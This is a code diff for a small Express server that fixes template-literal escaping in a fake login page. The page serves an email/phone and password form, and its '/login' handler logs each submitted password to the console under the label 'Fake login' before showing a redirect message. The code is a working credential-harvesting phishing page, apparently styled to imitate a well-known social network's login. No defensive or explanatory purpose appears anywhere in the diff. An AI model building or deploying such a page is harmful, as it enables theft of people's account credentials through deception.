@@ -5,7 +5,7 @@ const port = process.env.PORT || 3000;
 app.use(express.urlencoded({ extended: true }));
 
 app.get('/', (req, res) => {
-  res.send(\`
+  res.send(`
     <style>
       body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
       .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); width: 300px; text-align: center; }
@@ -27,15 +27,15 @@ app.get('/', (req, res) => {
         <button type="submit">Log In</button>
       </form>
     </div>
-  \`);
+  `);
 });
 
 app.post('/login', (req, res) => {
   const { email, password } = req.body;
-  console.log(\`Fake login — Email/Phone: \${email}, Password: \${password}\`);
+  console.log(`Fake login — Email/Phone: ${email}, Password: ${password}`);
   res.send("<h2>Thank you. Redirecting...</h2>");
 });
 
 app.listen(port, () => {
-  console.log(\`Server running on http://localhost:\${port}\`);
+  console.log(`Server running on http://localhost:${port}`);
 });
